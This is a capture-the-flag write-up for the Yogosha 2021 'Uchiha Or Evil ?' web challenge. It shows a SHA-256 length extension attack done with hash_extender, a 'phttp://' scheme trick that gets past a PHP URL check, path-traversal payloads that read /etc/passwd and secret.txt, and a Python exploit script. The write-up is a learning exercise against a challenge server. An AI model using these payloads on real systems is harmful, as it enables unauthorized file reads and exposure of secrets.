---
title: 'Uchiha Or Evil ?'
image: '/assets/APYxowi.png'
created: 2021-12-19
updated: 2021-12-19
tags:
  - 'ctf'
  - 'yogosha'
---

# Uchiha Or Evil ?

> Yogosha Christmas CTF 2021

---

```
I heard something important is stored in /secret.txt here: http://3.141.159.106 ; Maybe the akatsuki will help the Uchiha clan ?
```

- From the previous challenge we got a url. Let's visit the page.
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/1.png)

- Nothing much on this page. I ran `nikto` & got there is a `robots.txt` file here. We can check the robots.txt page & there's some interesting info. So there is page.Let's go to `read.php`
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/2.png)
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/3.png)
- We got access denied. There is an interesting line in the robots.txt file which is `User-agent: Uchiha`. Let's change our useragent to `Uchiha`. You can use burp or a user agent changer extension. And we have something here.
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/4.png)
- Let's view the source. We have 2 things here.
    1. The form is sending post data with some hash concatenated a filename
    2. Some dev notes(comments)

![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/5.png)

- If we send the form we can see some odd thing happening here. Looks like the source code of the `read.php` page is loading. So form the dev comment we can see we have to read the source here in-order to continue from here.
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/6.png)
- Let's save the source in a file & read the code.

```php
<?php
if ($_SERVER['HTTP_USER_AGENT']!=="Uchiha"){
 echo "Access Denied. Only Uchiha clan can access this";
}
else{
?>

<?php
include "secret.php";
if(isset($_POST['string'])){
 $arr=explode("|",$_POST['string']) ;
 $filenames=$arr[1];
 $hash=$arr[0];
 if($hash===hash("sha256", $SECRET.$filenames ) && preg_match("/\//",$filenames)===0 ){
  foreach(explode(":",$filenames) as $filename){
   if(in_array($filename,["read.php","index.php","guinjutsu.php"])) {
    $jutsu=file_get_contents($filename);
    echo "Sharingan: ".$jutsu;
  }
  }
 }
 else{
  echo "Verification Failed! You didn't awaken your sharingan!";
 }

}

}
?>
```

- So this program is using the [explode](https://www.w3schools.com/php/func_string_explode.asp) function to split the array into 2 parts. Hash and the file.Then it's checking the hash with a concatenating the filename with a secret & from the array we can see there are 3 files. We cannot lord any other file from here. Then it's just dumping the contents of the files we supplied using the delimiter `:` to split filenames.
- I stuck here for 2 days trying to get the secret. I even tried to bruteforce the secret. But the organizers told me it's not brute forcible. There are some attacks on hash but the hash is `sha256` with is one of the safest (at the time being. Everything is secure untill someone breaks it ;). Cutting short the ans is [Length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack). These are the article and videos that helped me.
  - <https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack>
  - <https://www.youtube.com/watch?v=sMla6_4Z-CQ>
  - <https://www.youtube.com/watch?v=6QQ4kgDWQ9w>
- It's a complicated attack so I left it to the smart people and used this tool [hash_extender](https://github.com/iagox86/hash_extender)
- Here is the syntax `hash_extender --data data --secret len-of-sec --append append --signature hash --format fomrat`. We know the data `read.php`, signature `184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5`, format `sha256` we want the length of the secret. We can bruteforce it like this to generate signatures.

```bash
#!/bin/bash

for i in $(seq 100)
do
    hash_extender --data 'read.php' --secret $i --append ":index.php:guinjutsu.php" --signature 184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5 --format sha256 --out-data-format=html | grep "New" | cut -d ' ' -f3 | sed ':a;N;$!ba;s/\n/|/g' >> hashes
done
```

- This script will generate a file called `hashes` concatenating the hashes. Then we can use burpsuite or python to send the hash & check the result.
- The correct length is `42`. And we can see the result here we have the source of `guinjutsu.php`
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/7.png)
- So we have another source code let's see this one in more details

```php
<?php
// This endpoint is deprecated due to some problems, I heard that other clans have stolen some jutsus
function check($url){
    $par=parse_url($url);
    if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000)){
        return True;

    }
    else{
        return False;
    }

}
if (isset($_POST['submit'])){
    if ((isset($_POST['api']))and(isset($_POST['endpoint']))){
        $url=$_POST['api'].$_POST['endpoint'];
        if (check($url)){
            $opts = array(
  'http'=>array(
    'method'=>"GET",
    'follow_location'=>false,
    'header'=>"Accept-language: en\r\n" 
  )
);
$context = stream_context_create($opts);
$file = file_get_contents($url, false, $context);
echo $file;

        }
    }
}

?>
```

- In short the `check` function is checking for the a url which looks like this `http://uchiha.fuinjutsukeeper.tech:5000/`. If the check passes then it'll concat the endpoint with the url & give the output of whatever we're supplying. So how can we exploit this we have to load something which is on the `http://uchiha.fuinjutsukeeper.tech:5000/` & we can't load anything else or can we...
- It took me an another day (:-\` yah I'm slow). Php is weird we all know.. This part `strpos($par['scheme'],'http')!==false)` only checks for if the `http` part is supplied in the url or not; i.e. `http`, `https`, `phttp`, `fhttp`, `httpf` etc will return true. Nice we can do something nasty here.
- If we send the payload as it is we'll get something like this. Because we have to load files from the machine i.e. `LFI`.
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/8.png)

- We can bypass this by using this paylaod
`submit=1&api=phttp://uchiha.fuinjutsukeeper.tech:5000/&endpoint=../../../../../../../../../../etc/passwd`
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/9.png)
- See we still got the error but we also got the contents of `/etc/passwd`. This is because this part.

```php
$context = stream_context_create($opts);
$file = file_get_contents($url, false, $context);
echo $file;
```

- This is because `phttp` is not a valid scheme and thus `file_get_contents` thinks it's just part of the filepath while `parse_url` thinks its just a weird scheme unknown to it, but with a valid host and port!. You can read more in this [writeup](https://deltaclock.gitbook.io/ctf-writeups/securinets-ctf-quals-2021-mixed). Always count on smart people.
- And with this payload `submit=1&api=phttp://uchiha.fuinjutsukeeper.tech:5000/&endpoint=../../../../../../../../../../secret.txt` we have the flag
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/10.png)

- Originally when I was solving this I don't know why burp was not showing any output here so I had the answer but wasted a lot of time. Then a friend of mine told me to use python. I was like why I haven't tried that lol (For the 100th time I'm saying count on smart people to avoid struggles like me) :-). Anyways here is the python script if anyone is interested.

```py
#!/usr/bin/python3
from requests import post
from re import findall

url = "http://3.141.159.106/"
headers = {"User-Agent": "Uchiha"}

data = {"submit":'1',"api":"shttp://uchiha.fuinjutsukeeper.tech:5000/","endpoint":"../../../../../../../../../../secret.txt"}

r = post(url + "/guinjutsu.php", headers=headers, data=data)

#print(r.text)

print(findall("Yogosha{.*", r.text)[0])
```

- Same thing we're sending the data as json format this time & everything else is same & I'm [regular expressions](https://en.wikipedia.org/wiki/Regular_expression) to extract the flag part only.
- `Yogosha{.*` means first get `Yogosha{`(flag format) then `.` means any character & finally `*` means any number of times( 0 or > 0) & then we're indexing the first item of the array(list for python)
![](https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/11.png)

#### Thank you for reading this write-up I hope it helped you. I was only able to solve only the first 2 challenges so that's all from me. I hope you learned something. I'll try to add links of other people whole solved the entire thing

- Check out [smaury's](https://github.com/smaury/CTF-writeups/tree/main/2021/yogosha-christmas-challenge) write-up he has solved all of them even the bonus one. Smart guy alert ;-" do check his write-up it's awesome.
